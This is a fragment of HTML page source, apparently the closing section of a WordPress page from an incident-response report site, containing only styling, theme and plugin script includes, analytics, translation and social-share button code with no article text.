.wp-block-jetpack-subscriptions__textfield .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form .wp-block-jetpack-subscriptions__textfield input[type=email],.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-base-control__field,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email .components-text-control__input,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email input[type=email]{height:auto;margin:0;width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline .wp-block-jetpack-subscriptions__form p#subscribe-submit,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-email,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline form p#subscribe-submit{line-height:0;margin:0;padding:0}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__show-subs .wp-block-jetpack-subscriptions__subscount{font-size:16px;margin:8px 0;text-align:end}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__form-elements{display:block}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__button,.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline button{display:inline-block;max-width:100%}.wp-block-jetpack-subscriptions.wp-block-jetpack-subscriptions__supports-newline.wp-block-jetpack-subscriptions__use-newline .wp-block-jetpack-subscriptions__subscount{text-align:start}#subscribe-submit.is-link{text-align:center;width:auto!important}#subscribe-submit.is-link a{margin-left:0!important;margin-top:0!important;width:auto!important}@keyframes jetpack-memberships_button__spinner-animation{to{transform:rotate(1turn)}}.jetpack-memberships-spinner{display:none;height:1em;margin:0 0 0 5px;width:1em}.jetpack-memberships-spinner svg{height:100%;margin-bottom:-2px;width:100%}.jetpack-memberships-spinner-rotating{animation:jetpack-memberships_button__spinner-animation .75s linear infinite;transform-origin:center}.is-loading .jetpack-memberships-spinner{display:inline-block}body.jetpack-memberships-modal-open{overflow:hidden}dialog.jetpack-memberships-modal{opacity:1}dialog.jetpack-memberships-modal,dialog.jetpack-memberships-modal iframe{background:#0000;border:0;bottom:0;box-shadow:none;height:100%;left:0;margin:0;padding:0;position:fixed;right:0;top:0;width:100%}dialog.jetpack-memberships-modal::backdrop{background-color:#000;opacity:.7;transition:opacity .2s ease-out}dialog.jetpack-memberships-modal.is-loading,dialog.jetpack-memberships-modal.is-loading::backdrop{opacity:0}
</style>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/navigation.min.js?ver=6.7.2" id="freenews-navigation-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/js/skip-link-focus-fix.js?ver=6.7.2" id="freenews-skip-link-focus-fix-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/ResizeSensor.min.js?ver=6.7.2" id="ResizeSensor-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky-sidebar/theia-sticky-sidebar.min.js?ver=6.7.2" id="theia-sticky-sidebar-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick.min.js?ver=6.7.2" id="slick-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/slick/slick-settings.js?ver=6.7.2" id="freenews-slick-settings-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/jquery.sticky.js?ver=6.7.2" id="jquery-sticky-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/sticky/sticky-setting.js?ver=6.7.2" id="freenews-sticky-settings-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/jquery.marquee.min.js?ver=6.7.2" id="marquee-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/themes/freenews/assets/library/marquee/marquee-settings.js?ver=6.7.2" id="freenews-marquee-settings-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" id="jetpack-stats-js-before">
/* <![CDATA[ */
_stq = window._stq || [];
_stq.push([ "view", JSON.parse("{\"v\":\"ext\",\"blog\":\"175340963\",\"post\":\"4551\",\"tz\":\"0\",\"srv\":\"thedfirreport.com\",\"j\":\"1:14.4\"}") ]);
_stq.push([ "clickTrackerInit", "175340963", "4551" ]);
/* ]]> */
</script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://stats.wp.com/e-202511.js" id="jetpack-stats-js" defer="defer" data-wp-strategy="defer"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" id="google-translate-init-js-extra">
/* <![CDATA[ */
var _wp_google_translate_widget = {"lang":"en_US","layout":"0"};
/* ]]> */
</script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://c0.wp.com/p/jetpack/14.4/_inc/build/widgets/google-translate/google-translate.min.js" id="google-translate-init-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit&amp;ver=14.4" id="google-translate-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" id="jetpack-blocks-assets-base-url-js-before">
/* <![CDATA[ */
var Jetpack_Block_Assets_Base_Url="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/";
/* ]]> */
</script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/dist/dom-ready.min.js" id="wp-dom-ready-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://c0.wp.com/c/6.7.2/wp-includes/js/dist/vendor/wp-polyfill.min.js" id="wp-polyfill-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://thedfirreport.com/wp-content/plugins/jetpack/_inc/blocks/subscriptions/view.js?minify=false&amp;ver=14.4" id="jetpack-block-subscriptions-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" id="sharing-js-js-extra">
/* <![CDATA[ */
var sharing_js_options = {"lang":"en","counts":"1","is_stats_active":"1"};
/* ]]> */
</script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" src="https://c0.wp.com/p/jetpack/14.4/_inc/build/sharedaddy/sharing.min.js" id="sharing-js-js"></script>
<script type="d4f6f922a1a6506cd6aa1d03-text/javascript" id="sharing-js-js-after">
/* <![CDATA[ */
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-twitter' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-twitter' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomtwitter', 'menubar=1,resizable=1,width=600,height=350' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-linkedin' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-linkedin' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomlinkedin', 'menubar=1,resizable=1,width=580,height=450' );
						return false;
					}
				} );
			} )();
var windowOpen;
			( function () {
				function matches( el, sel ) {
					return !! (
						el.matches && el.matches( sel ) ||
						el.msMatchesSelector && el.msMatchesSelector( sel )
					);
				}

				document.body.addEventListener( 'click', function ( event ) {
					if ( ! event.target ) {
						return;
					}

					var el;
					if ( matches( event.target, 'a.share-facebook' ) ) {
						el = event.target;
					} else if ( event.target.parentNode && matches( event.target.parentNode, 'a.share-facebook' ) ) {
						el = event.target.parentNode;
					}

					if ( el ) {
						event.preventDefault();

						// If there's another sharing window open, close it.
						if ( typeof windowOpen !== 'undefined' ) {
							windowOpen.close();
						}
						windowOpen = window.open( el.getAttribute( 'href' ), 'wpcomfacebook', 'menubar=1,resizable=1,width=600,height=400' );
						return false;
					}
				} );
			} )();
/* ]]> */
</script>

<script src="/cdn-cgi/scripts/7d0fa10a/cloudflare-static/rocket-loader.min.js" data-cf-settings="d4f6f922a1a6506cd6aa1d03-|49" defer></script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"91ee514c0976223d","version":"2025.1.0","r":1,"serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}},"token":"e6611380fbbe475a97dc9cf0a0e9fd2b","b":1}' crossorigin="anonymous"></script>
</body>
</html>
